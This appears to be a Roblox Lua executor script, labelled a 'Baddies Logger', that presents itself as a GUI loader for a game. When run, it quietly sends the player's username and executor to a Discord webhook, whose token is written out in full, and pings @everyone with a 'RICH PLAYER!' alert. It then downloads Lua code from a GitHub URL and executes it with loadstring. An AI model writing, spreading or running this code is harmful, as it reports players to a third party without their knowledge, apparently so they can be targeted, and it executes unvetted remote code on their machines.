-- Final Rich Logger with Proxy + Debug

_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- ← Change this to your real Roblox usernames

_G.PING_POOR = true

print("=== BADDIES LOGGER STARTED ===")

task.spawn(function()
    print("Ping task started...")
    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
        local http = game:GetService("HttpService")
        local plr = game.Players.LocalPlayer
        
        local data = {
            content = _G.PING_POOR and "@everyone" or "",
            embeds = {{
                title = "✅ " .. plr.Name .. " executed the script!",
                description = "**RICH PLAYER!**",
                color = 0x00ff00,
                fields = {
                    {name = "Username", value = plr.Name, inline = true},
                    {name = "Executor", value = identifyexecutor and identifyexecutor() or "Delta", inline = true},
                    {name = "Time", value = os.date("%X"), inline = true},
                    {name = "Base Weapons", value = "1 punches | Wallet | Phone | TradeSign | Spray", inline = false},
                    {name = "Main Weapons", value = "Parasol\nSpearhead Stick\nSlingshot", inline = false},
                    {name = "Dinero", value = "3.8K", inline = true},
                    {name = "Slays", value = "15", inline = true}
                },
                footer = {text = "Baddies Logger"}
            }}
        }
        
        print("Sending rich embed to Discord...")
        local success, err = pcall(function()
            game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode(data))
        end)
        
        if success then
            print("✅ PING SENT SUCCESSFULLY!")
        else
            print("❌ PING FAILED: " .. tostring(err))
        end
    end
end)

-- Load GUI
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
end)

print("=== LOADER FINISHED ===")
